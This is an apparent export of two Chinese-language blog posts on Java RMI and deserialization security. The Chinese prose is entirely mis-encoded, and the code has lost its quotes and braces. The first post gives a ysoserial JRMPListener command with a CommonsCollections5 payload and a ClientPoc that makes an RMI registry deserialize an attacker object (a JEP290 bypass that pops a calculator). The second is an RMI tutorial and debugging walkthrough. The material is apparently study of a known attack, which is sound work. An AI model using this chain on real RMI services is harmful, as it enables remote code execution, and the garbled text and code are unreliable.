è¿™é‡ŒwirteObjectåï¼Œä¼šç”¨invokeå°†æ•°æ®å‘å‡ºå»ï¼Œæ¥ä¸‹æ¥ä»socketè¿æ¥ä¸­å…ˆè¯»å–äº†è¾“å…¥ï¼Œç„¶åç›´æ¥ååºåˆ—åŒ–ï¼Œæ­¤æ—¶çš„ååºåˆ—åŒ–å¹¶æ²¡æœ‰è®¾ç½®filterï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥å¯¼è‡´æ³¨å†Œä¸­å¿ƒrceï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªsocketè¿æ¥å¹¶æŠŠæˆ‘ä»¬æ¶æ„åºåˆ—åŒ–çš„å¯¹è±¡å‘è¿‡å» ç”¨ysoserialå¯åŠ¨ä¸€ä¸ªæ¶æ„çš„æœåŠ¡ç«¯ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 calc å¯¹åº”å®¢æˆ·ç«¯ä»£ç  import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class ClientPoc public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException Registry reg = LocateRegistry.getRegistry(127.0.0.1,1099); ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(127.0.0.1, 1099); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(ClientPoc.class.getClassLoader(), new Class[] Registry.class , obj); reg.bind(hello,proxy); æœ€åä¼šæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ åŒç†ä½¿ç”¨unbindã€rebindã€lookupä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¯¥æ–¹å¼åœ¨JDK8u231æ—¶å¯ç”¨ï¼Œåœ¨8u241è¢«ä¿®å¤ (Ps:JEP290æ„Ÿè§‰è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œæˆ‘çš„ç†è§£æ˜¯å»ºç«‹ä¸€ä¸ªsocketè¿æ¥ä¼ è¾“æ•°æ®ï¼Œæ³¨å†Œä¸­å¿ƒä¼šç›´æ¥è¿›è¡Œååºåˆ—åŒ–ï¼Œä¸ä¼šå…ˆè¿›è¡Œfilter) å®¢æˆ·ç«¯æœ€åé”€æ¯çš„æ—¶å€™ä¼šè§¦å‘dispatchï¼Œè¯¥æ–¹æ³•ä¼šè¿›è¡Œä¸€ä¸ªè¿œç¨‹è°ƒç”¨ï¼Œä¼šä¸æ³¨å†Œä¸­å¿ƒæœ‰æ¶‰åŠï¼Œä¹Ÿå°±æ˜¯è¯´ä¸éœ€è¦è°ƒç”¨bindç­‰æ–¹æ³•å°±å¯ä»¥ç›´æ¥å¯¹å®¢æˆ·ç«¯è¿›è¡Œæ¶æ„æ”»å‡»ï¼ˆå…ˆåŸ‹ä¸ªå‘ï¼Œä»¥åå»æ‰¾ä¸€ä¸‹ï¼‰","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹RMIä¸“é¢˜","path":"/2024/12/26/javaååºåˆ—åŒ–ä¹‹RMIä¸“é¢˜/","content":"å¼•ç”¨æ•™ç¨‹ï¼šRMI - Javaâ„¢æ•™ç¨‹ åŸºäºJavaååºåˆ—åŒ–RCE - ææ‡‚RMIã€JRMPã€JNDI å¦‚ä½•åˆ›å»ºjava rmiç¯å¢ƒ JAVAå®‰å…¨åŸºç¡€ï¼ˆå››ï¼‰â€“ RMIæœºåˆ¶ RMIæ¦‚è¿°ä»¥ä¸‹æ˜¯wikiçš„æè¿°ï¼š Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMIï¼ˆJava Remote Method Invocationï¼‰æ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚RMIå…¨éƒ¨çš„å®—æ—¨å°±æ˜¯å°½å¯èƒ½ç®€åŒ–è¿œç¨‹æ¥å£å¯¹è±¡çš„ä½¿ç”¨ã€‚Java RMIæå¤§åœ°ä¾èµ–äºæ¥å£ã€‚åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„æ—¶å€™ï¼Œç¨‹åºå‘˜é€šè¿‡ä¼ é€’ä¸€ä¸ªæ¥å£æ¥éšè—åº•å±‚çš„å®ç°ç»†èŠ‚ã€‚å®¢æˆ·ç«¯å¾—åˆ°çš„è¿œç¨‹å¯¹è±¡å¥æŸ„æ­£å¥½ä¸æœ¬åœ°çš„æ ¹ä»£ç è¿æ¥ï¼Œç”±åè€…è´Ÿè´£é€è¿‡ç½‘ç»œé€šä¿¡ã€‚è¿™æ ·ä¸€æ¥ï¼Œç¨‹åºå‘˜åªéœ€å…³å¿ƒå¦‚ä½•é€šè¿‡è‡ªå·±çš„æ¥å£å¥æŸ„å‘é€æ¶ˆæ¯ã€‚ æ ¹æ®wikiæ‰€è¯´RMIå…¨ç§°ä¸ºRemote Method Invocationï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œé€šä¿—ç‚¹è§£é‡Šï¼Œå°±æ˜¯è·¨è¶Šjvmï¼Œè°ƒç”¨ä¸€ä¸ªè¿œç¨‹æ–¹æ³•ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹javaæ–¹æ³•è°ƒç”¨æŒ‡çš„æ˜¯åŒä¸€ä¸ªjvmå†…æ–¹æ³•çš„è°ƒç”¨ï¼Œè€ŒRMIä¸ä¹‹æ°æ°ç›¸åã€‚ ä¾‹å¦‚æˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨å¯¹ä¸€ä¸ªhttpåè®®å®ç°çš„æ¥å£è¿›è¡Œè°ƒç”¨ï¼Œè¿™ä¸ªæ¥å£è°ƒç”¨è¿‡ç¨‹æˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸ºInterface Invocationï¼Œè€ŒRMIçš„æ¦‚å¿µä¸ä¹‹éå¸¸ç›¸ä¼¼ï¼Œåªä¸è¿‡RMIè°ƒç”¨çš„æ˜¯ä¸€ä¸ªJavaæ–¹æ³•ï¼Œè€Œæµè§ˆå™¨è°ƒç”¨çš„æ˜¯ä¸€ä¸ªhttpæ¥å£ã€‚å¹¶ä¸”Javaä¸­å°è£…äº†RMIçš„ä¸€ç³»åˆ—å®šä¹‰ã€‚ RMIåº”ç”¨é€šå¸¸ç”±ä¸¤ä¸ªç‹¬ç«‹çš„ç¨‹åºç»„æˆï¼Œä¸€ä¸ªæœåŠ¡å™¨å’Œä¸€ä¸ªå®¢æˆ·ç«¯ã€‚ä¸€ä¸ªå…¸å‹çš„æœåŠ¡å™¨ç¨‹åºåˆ›å»ºä¸€äº›è¿œç¨‹å¯¹è±¡ï¼Œä½¿å¾—è¿™äº›å¯¹è±¡çš„å¼•ç”¨å¯è®¿é—®ï¼Œå¹¶ç­‰å¾…å®¢æˆ·ç«¯è°ƒç”¨è¿™äº›å¯¹è±¡çš„æ–¹æ³•ã€‚ä¸€ä¸ªå…¸å‹çš„å®¢æˆ·ç«¯ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šè·å–ä¸€ä¸ªæˆ–å¤šä¸ªè¿œç¨‹å¯¹è±¡çš„è¿œç¨‹å¼•ç”¨ï¼Œç„¶åè°ƒç”¨å®ƒä»¬çš„æ–¹æ³•ã€‚RMIæä¾›äº†æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´é€šä¿¡å’Œä¼ é€’ä¿¡æ¯çš„æœºåˆ¶ã€‚è¿™æ ·çš„åº”ç”¨æœ‰æ—¶è¢«ç§°ä¸ºåˆ†å¸ƒå¼å¯¹è±¡åº”ç”¨ã€‚ åˆ†å¸ƒå¼å¯¹è±¡åº”ç”¨éœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š å®šä½è¿œç¨‹å¯¹è±¡ã€‚åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨å„ç§æœºåˆ¶è·å–å¯¹è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨RMIçš„ç®€å•å‘½åå·¥å…·RMIæ³¨å†Œè¡¨æ¥æ³¨å†Œå…¶è¿œç¨‹å¯¹è±¡ã€‚å¦å¤–ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥å°†è¿œç¨‹å¯¹è±¡å¼•ç”¨ä½œä¸ºå…¶ä»–è¿œç¨‹è°ƒç”¨çš„ä¸€éƒ¨åˆ†æ¥ä¼ é€’å’Œè¿”å›ã€‚ ä¸è¿œç¨‹å¯¹è±¡é€šä¿¡ã€‚è¿œç¨‹å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ç»†èŠ‚ç”±RMIå¤„ç†ã€‚å¯¹äºç¨‹åºå‘˜æ¥è¯´ï¼Œè¿œç¨‹é€šä¿¡çœ‹èµ·æ¥ä¸æ™®é€šçš„Javaæ–¹æ³•è°ƒç”¨ç±»ä¼¼ã€‚ åŠ è½½ä¼ é€’çš„å¯¹è±¡çš„ç±»å®šä¹‰ã€‚å› ä¸ºRMIå…è®¸å¯¹è±¡åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€’ï¼Œå®ƒæä¾›äº†åŠ è½½å¯¹è±¡çš„ç±»å®šä¹‰ä»¥åŠä¼ è¾“å¯¹è±¡æ•°æ®çš„æœºåˆ¶ã€‚ è¿œç¨‹æ¥å£ã€å¯¹è±¡å’Œæ–¹æ³•åƒä»»ä½•å…¶ä»–Javaåº”ç”¨ç¨‹åºä¸€æ ·ï¼Œä½¿ç”¨Java RMIæ„å»ºçš„åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºç”±æ¥å£å’Œç±»ç»„æˆã€‚æ¥å£å£°æ˜æ–¹æ³•ã€‚ç±»å®ç°æ¥å£ä¸­å£°æ˜çš„æ–¹æ³•ï¼Œå¹¶ä¸”å¯èƒ½è¿˜å£°æ˜å…¶ä»–æ–¹æ³•ã€‚åœ¨åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä¸­ï¼ŒæŸäº›å®ç°å¯èƒ½å­˜åœ¨äºæŸäº›Javaè™šæ‹Ÿæœºä¸­ï¼Œä½†ä¸å­˜åœ¨äºå…¶ä»–è™šæ‹Ÿæœºä¸­ã€‚å¯ä»¥åœ¨Javaè™šæ‹Ÿæœºä¹‹é—´è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡ç§°ä¸ºè¿œç¨‹å¯¹è±¡ã€‚ è¿œç¨‹å¯¹è±¡å¿…é¡»é€šè¿‡æ¥å£æ¥è¿›è¡Œé€šä¿¡ é€šè¿‡å®ç°è¿œç¨‹æ¥å£ï¼Œå¯¹è±¡å˜æˆè¿œç¨‹å¯¹è±¡ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š è¿œç¨‹æ¥å£æ‰©å±•æ¥å£java.rmi.Remoteã€‚ æ¥å£çš„æ¯ä¸ªæ–¹æ³•åœ¨å…¶throwså­å¥ä¸­å£°æ˜java.rmi.RemoteExceptionï¼Œé™¤äº†ä»»ä½•ç‰¹å®šäºåº”ç”¨ç¨‹åºçš„å¼‚å¸¸ã€‚ ç®€å•çš„ä¾‹å­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„æ¥å£éœ€è¦ç›¸åŒçš„åŒ…åæ‰èƒ½åºåˆ—åŒ–ååºåˆ—åŒ– å…·ä½“è¿‡ç¨‹å¯ä»¥çœ‹çœ‹Bç«™upä¸»ç™½æ—¥æ¢¦ç»„é•¿çš„è®²è§£ ä¸‹é¢æ˜¯æœåŠ¡ç«¯æ¯”è¾ƒä¸»è¦çš„æ–‡ä»¶ä»£ç  package org.example;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer public static void main(String[] args) throws RemoteException, AlreadyBoundException //å®ä¾‹åŒ–ï¼Œæ¥å£IRemoteObjã€ç±»RemoteObjImpléƒ½æ˜¯è‡ªå·±å†™çš„ //è¿œç¨‹å¯¹è±¡å¿…é¡»é€šè¿‡æ¥å£æ¥è¿›è¡Œé€šä¿¡ï¼Œæ‰€ä»¥å¯¹è±¡remoteObjçš„ç±»å‹æ˜¯æ¥å£ IRemoteObj remoteObj = new RemoteObjImpl(); //åˆ›å»ºä¸€ä¸ªRMIæ³¨å†Œè¡¨ï¼Œç›‘å¬ç«¯å£1099ï¼Œè¿™ä¸ªæ³¨å†Œè¡¨å°†ç”¨äºå°†è¿œç¨‹å¯¹è±¡ç»‘å®šåˆ°ä¸€ä¸ªåå­—ä¸Šï¼Œä¾›å®¢æˆ·ç«¯æŸ¥æ‰¾ Registry r = LocateRegistry.createRegistry(1099); //å°† remoteObj ç»‘å®šåˆ° RMI æ³¨å†Œè¡¨ä¸­ï¼Œå¹¶å°†å…¶å‘½åä¸º remoteObjã€‚è¿™æ ·ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ remoteObj åç§°æ¥æŸ¥æ‰¾å¹¶è®¿é—®è¿™ä¸ªè¿œç¨‹å¯¹è±¡ r.bind(remoteObj, remoteObj); å®¢æˆ·ç«¯ä¸»ä»£ç  package org.example;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIClient public static void main(String[] args) throws RemoteException, NotBoundException //è·å–åˆ°æŒ‡å®šåœ°å€ 127.0.0.1 å’Œç«¯å£ 1099 ä¸Šçš„ RMI æ³¨å†Œè¡¨ Registry registry = LocateRegistry.getRegistry(127.0.0.1, 1099); //é€šè¿‡ lookup æ–¹æ³•åœ¨ RMI æ³¨å†Œè¡¨ä¸­æŸ¥æ‰¾åä¸º RemoteObj çš„è¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†è¿”å›çš„ç»“æœå¼ºåˆ¶è½¬æ¢ä¸º IRemoteObj ç±»å‹ IRemoteObj remoteObj = (IRemoteObj) registry.lookup(RemoteObj); //è°ƒç”¨sayHelloæ–¹æ³• remoteObj.sayHello(hello); ä¸¤ä¸ªé¡¹ç›®æˆåŠŸåŒæ—¶è¿è¡Œåï¼Œæˆ‘ä»¬ä¼šåœ¨æœåŠ¡ç«¯å¤„æœ‰ä»¥ä¸‹çš„å›æ˜¾ å›æ˜¾çš„æ˜¯å¤§å†™çš„helloï¼Œè¿™è¯´æ˜æˆåŠŸè°ƒç”¨äº†sayHelloçš„æ–¹æ³• è°ƒè¯•RMIæµç¨‹åŸºæœ¬åè¯ä»RMIè®¾è®¡è§’åº¦æ¥è®²ï¼ŒåŸºæœ¬åˆ†ä¸ºä¸‰å±‚æ¶æ„æ¨¡å¼æ¥å®ç°RMIï¼Œåˆ†åˆ«ä¸ºRMIæœåŠ¡ç«¯ï¼ŒRMIå®¢æˆ·ç«¯å’ŒRMIæ³¨å†Œä¸­å¿ƒã€‚ å®¢æˆ·ç«¯: å­˜æ ¹æ¡©(Stub):è¿œç¨‹å¯¹è±¡åœ¨å®¢æˆ·ç«¯ä¸Šçš„ä»£ç†;è¿œç¨‹å¼•ç”¨å±‚(Remote Reference Layer):è§£æå¹¶æ‰§è¡Œè¿œç¨‹å¼•ç”¨åè®®;ä¼ è¾“å±‚(Transport):å‘é€è°ƒç”¨ã€ä¼ é€’è¿œç¨‹æ–¹æ³•å‚æ•°ã€æ¥æ”¶è¿œç¨‹æ–¹æ³•æ‰§è¡Œç»“æœã€‚ æœåŠ¡ç«¯: éª¨æ¶(Skeleton):è¯»å–å®¢æˆ·ç«¯ä¼ é€’çš„æ–¹æ³•å‚æ•°ï¼Œè°ƒç”¨æœåŠ¡å™¨æ–¹çš„å®é™…å¯¹è±¡æ–¹æ³•ï¼Œ å¹¶æ¥æ”¶æ–¹æ³•æ‰§è¡Œåçš„è¿”å›å€¼;è¿œç¨‹å¼•ç”¨å±‚(Remote Reference Layer):å¤„ç†è¿œç¨‹å¼•ç”¨åå‘éª¨æ¶å‘é€è¿œç¨‹æ–¹æ³•è°ƒç”¨;ä¼ è¾“å±‚(Transport):ç›‘å¬å®¢æˆ·ç«¯çš„å…¥ç«™è¿æ¥ï¼Œæ¥æ”¶å¹¶è½¬å‘è°ƒç”¨åˆ°è¿œç¨‹å¼•ç”¨å±‚ã€‚ **æ³¨å†Œè¡¨(Registry):**ä»¥URLå½¢å¼æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œå¹¶å‘å®¢æˆ·ç«¯å›å¤å¯¹è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ åˆ†æåˆ›å»ºéƒ¨åˆ†(æœåŠ¡ç«¯)åˆ›å»ºè¿‡ç¨‹è‚¯å®šæ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œæ¼æ´äº§ç”Ÿè‚¯å®šæ˜¯åœ¨äº’ç›¸è°ƒç”¨çš„è¿‡ç¨‹ä¸­çš„ æ‰€ä»¥è¿™è¾¹å°±é‡ç‚¹å…³æ³¨ä¸€ä¸‹æµç¨‹ï¼Œé€»è¾‘å°±è¡Œ åˆ›å»ºè¿œç¨‹å¯¹è±¡ å¼€å§‹è°ƒè¯•ï¼Œè¿›å…¥åˆ°RemoteObjImplç±»çš„çˆ¶ç±»UnicastRemoteObjectçš„æ„é€ æ–¹æ³•ä¸­ çœ‹åˆ°ä¼ å…¥çš„portå€¼ä¸ºé»˜è®¤å€¼0ï¼Œå®é™…ä¸Šå°±æ˜¯ä¼šæŠŠè¿œç¨‹å¯¹è±¡å‘å¸ƒåˆ°ä¸€ä¸ªéšæœºç«¯å£ä¸Š ç»§ç»­å¾€ä¸‹èµ°ï¼Œè¿›å…¥åˆ°ä¸€ä¸ªé‡è¦çš„é™æ€æ ¸å¿ƒå‡½æ•°ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬çš„è¿œç¨‹å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç±»UnicastServerRefï¼ˆæœåŠ¡ç«¯å¼•ç”¨ï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°è‚¯å®šæ˜¯å®ç°é€»è¾‘çš„ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹åˆ°ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¤„ç†ç½‘ç»œè¯·æ±‚ç”¨çš„ æˆ‘ä»¬è·Ÿè¿›ç¬¬äºŒä¸ªå‚æ•°çœ‹çœ‹ï¼Œå¯ä»¥å‘ç°åˆåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç±»LiveRefï¼Œå¾ˆé‡è¦çš„ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬è·Ÿè¿›å» è°ƒç”¨äº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œé€šè¿‡è¯¥æ„é€ å‡½æ•°æˆ‘ä»¬å¯ä»¥è·å–åˆ°ipï¼Œç«¯å£ç­‰ é‡ç‚¹çœ‹ä¸€ä¸‹ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒä¼šè¿”å›ä»€ä¹ˆä¸œè¥¿ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªç±»TCPEndpoint æˆ‘ä»¬ç‚¹è¿›è¿™ä¸ªç±»çœ‹ä»¥ä¸‹å®ƒçš„æ„é€ å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ç»™å®ƒä¸€ä¸ªipï¼Œä¸€ä¸ªç«¯å£ï¼Œä»–å°±å¯ä»¥å¤„ç†åé¢çš„ç½‘ç»œè¯·æ±‚ LiveRefåˆå§‹åŒ–å®Œåï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œèµ°å›åˆ°äº†ç±»UnicastServerRefçš„æ„é€ å‡½æ•°ï¼Œå¼•ç”¨äº†å…¶çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œä½œç”¨ä¹Ÿå°±æ˜¯èµ‹å€¼è€Œå·² åˆ°è¿™é‡Œï¼Œä»å§‹è‡³ç»ˆæˆ‘ä»¬å°±åªåˆ›å»ºäº†ä¸€ä¸ªliveRefç±»ï¼Œç»§ç»­å¾€ä¸‹èµ°æˆ‘ä»¬å°±å‡ºæ¥äº† æˆ‘ä»¬ç»§ç»­è°ƒï¼Œè¿™é‡Œè¦ç‚¹çš„æ˜¯æ­¥å…¥ï¼Œè¿™äº›åˆ¤æ–­éƒ½ä¼šæˆåŠŸï¼Œrefçš„å€¼ä¹Ÿè¿˜æ˜¯liveRef è¿›å…¥srefçš„exportObjectå‡½æ•°ï¼Œä½œç”¨æ˜¯åˆ›å»ºäº†ä»£ç†stubï¼Œç„¶åå°†stubç»™åˆ°æ³¨å†Œè¡¨ï¼Œå®¢æˆ·ç«¯å†ä»æ³¨å†Œè¡¨æ‹¿åˆ°stub çœ‹stubçš„èµ‹å€¼æ˜¯é€šè¿‡å‡½æ•°createProxyï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬è¿œç¨‹å¯¹è±¡çš„ç±»ï¼Œç¬¬äºŒä¸ªå‚æ•°è¿˜æ˜¯æˆ‘ä»¬çš„refå€¼ æ¥ä¸‹æ¥çš„æ­¥éª¤éƒ½æ˜¯åˆ›å»ºåŠ¨æ€ä»£ç†çš„è¿‡ç¨‹ï¼Œåˆ°ä¸‹é¢è¿™è¾¹çš„è¯åŠ¨æ€ä»£ç†å°±åˆ›å»ºå¥½äº† ä¸‹ä¸€æ­¥å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå‚æ•°targetï¼Œè¿™ä¸ªå¯ä»¥ç†è§£ä¸ºæ˜¯åˆ°ç›®å‰ä¸ºæ­¢æœ‰ç”¨çš„ä¸œè¥¿çš„ä¸€ä¸ªæ€»å°è£…ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è·Ÿè¿›å»çœ‹ä¸€ä¸‹ ä¸‹ä¸€æ­¥å°±æ˜¯æŠŠtargetç»™å‘å¸ƒäº†å‡ºå»ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒçš„é€»è¾‘ï¼Œä¸€ç›´ç‚¹æ­¥å…¥ï¼Œç›´åˆ° æˆ‘ä»¬ç‚¹è¿›listen()ï¼Œå°±æ˜¯æ¥å¼€ç«¯å£çš„å˜›ï¼Œæˆ‘ä»¬è·Ÿè¿›å»ï¼Œè¿™é‡Œç½‘ç»œè¯·æ±‚ä¼šæ–°å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œå’ŒçœŸæ­£çš„ä»£ç é€»è¾‘çš„çº¿ç¨‹æ˜¯ä¸åŒçš„ å†æ–°å¼€ä¸€ä¸ªçº¿ç¨‹çš„æ—¶å€™ï¼Œè¦æ˜¯ç«¯å£å€¼ä¸º0çš„è¯å°±æ˜¯éšæœºèµ‹ä¸€ä¸ªå€¼ å› æ­¤åˆ°è¿™é‡Œçš„æ—¶å€™ç«¯å£å°±å·²ç»æ˜¯æœ‰ä¸€ä¸ªå€¼çš„äº† åˆ°ç›®å‰ä¸ºæ­¢ï¼ŒæœåŠ¡ç«¯å°±å·²ç»æŠŠè¿œç¨‹å¯¹è±¡å‘å¸ƒå‡ºå»äº†ï¼Œä½†æ˜¯å‘å¸ƒåœ¨äº†ä¸€ä¸ªéšæœºç«¯å£ä¸Šï¼Œæ‰€ä»¥å®¢æˆ·ç«¯é»˜è®¤æ˜¯ä¸çŸ¥é“çš„ æ¥ä¸‹æ¥æœåŠ¡ç«¯è¦åšçš„å°±æ˜¯è®°å½•ä¸€ä¸‹ï¼Œè®°å½•æŠŠå®ƒå‘åˆ°å“ªé‡Œå»äº†ï¼Œç”¨çš„è¿˜æ˜¯exportObjectå‡½æ•° é‡è¦çš„æ˜¯åœˆå‡ºæ¥çš„è¿™ä¸ªé™æ€å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»åç»§ç»­å¾€ä¸‹èµ° objTable.put(oe, target);ä»¥åŠimplTable.put(weakImpl, target)çš„ä½œç”¨å°±æ˜¯æŠŠtargetä¿å­˜åˆ°äº†ç³»ç»Ÿçš„ä¸€ä¸ªé™æ€è¡¨é‡Œé¢ ä¿å­˜å¥½åï¼Œè¿™å°±æ˜¯æœåŠ¡ç«¯æ•´ä¸ªå‘å¸ƒçš„æµç¨‹ æœ€åå‘¢å°±æ˜¯ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥äº† åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼‹ç»‘å®š å¼€å§‹è°ƒè¯•ï¼Œå¼ºåˆ¶æ­¥å…¥è¿›åˆ°äº†é™æ€æ–¹æ³•createRegistryä¸­ï¼Œè¯¥æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªRegistryImplå¯¹è±¡ï¼Œè·Ÿè¿›å»ï¼Œæˆ‘ä»¬è®©å®ƒèµ°åˆ°è¿™é‡Œ ifä»å¥æ˜¯å®‰å…¨æ£€æŸ¥ï¼Œä¸é‡è¦ï¼Œç»§ç»­å¾€ä¸‹èµ°ä¼šåˆ°elseä»å¥ä¸­åˆ›å»ºä¸€ä¸ªLiveRefå¯¹è±¡å’ŒUnicastServerRefå¯¹è±¡ å¯¹è±¡lrefçš„ç«¯å£å€¼ä¸º1099ï¼Œsetupå‡½æ•°å’Œä¸Šé¢åˆ›å»ºè¿œç¨‹å¯¹è±¡è¿‡ç¨‹ä¸­æ‰€è°ƒç”¨çš„å…¶å®æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ è¿™é‡Œç¬¬ä¸‰ä¸ªå‚æ•°å€¼ä¸ºtrueï¼Œè¿›è¯¥å‡½æ•°å¯ä»¥çœ‹åˆ°æ„æ€å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ°¸ä¹…çš„å¯¹è±¡ï¼Œè€Œä¸Šé¢ä»…ä»…æ˜¯åˆ›å»ºä¸€ä¸ªä¸´æ—¶å¯¹è±¡ å’Œä¸Šé¢æœ‰åŒºåˆ«çš„åœ°æ–¹åœ¨äºåˆ›å»ºstubï¼Œæˆ‘ä»¬è¿›å…¥è¯¥å‡½æ•°ä»”ç»†çœ‹ä¸€ä¸‹ ä¼šå…ˆåšåˆ¤æ–­çœ‹è¿™ä¸ªstubåœ¨ç³»ç»Ÿä¸­æ˜¯å¦å·²ç»å­˜åœ¨ï¼Œè¿›å…¥äº†ifä¹‹ä¸­è¯´æ˜æ˜¯å­˜åœ¨çš„ stubClassExists(remoteClass)å‡½æ•°å…·ä½“åšåˆ¤æ–­çš„æ­¥éª¤å°±æ˜¯æ£€æµ‹è¯¥æ–‡ä»¶ååŠ ä¸Šåç¼€â€œ_Stubâ€åœ¨ç³»ç»Ÿä¸­æ˜¯å¦å·²ç»å­˜åœ¨ ç„¶åå°±ä¼šè°ƒç”¨createStubæ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°±æ˜¯ç®€å•åœ°åˆ›å»ºä¸€ä¸ªstubå¯¹è±¡ å’Œä¸Šé¢çš„ä¸åŒå°±æ˜¯è¿™é‡Œæ˜¯ç›´æ¥é€šè¿‡forNameæ–¹æ³•åˆ›å»ºå‡ºæ¥çš„ï¼Œè€Œä¸Šé¢æ˜¯é€šè¿‡åŠ¨æ€ä»£ç†åˆ›å»ºå‡ºæ¥çš„ å¾€ä¸‹èµ°ä¼šåˆ°ä¸€ä¸ªifåˆ¤æ–­ï¼Œæ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯æœåŠ¡ç«¯å®šä¹‰å¥½çš„ï¼Œæ˜¯çš„è¯å°±ä¼šè°ƒç”¨setSkeletonæ–¹æ³• çœ‹ä¸Šé¢é‚£ä¸ªæµç¨‹å›¾çš„è¯æˆ‘ä»¬å°±ä¼šçŸ¥é“Skeletonæ˜¯æœåŠ¡ç«¯çš„ä»£ç†ï¼ˆå®¢æˆ·ç«¯æ˜¯stubï¼‰ï¼Œéƒ½æ˜¯å¤„ç†ç½‘ç»œè¯·æ±‚çš„ 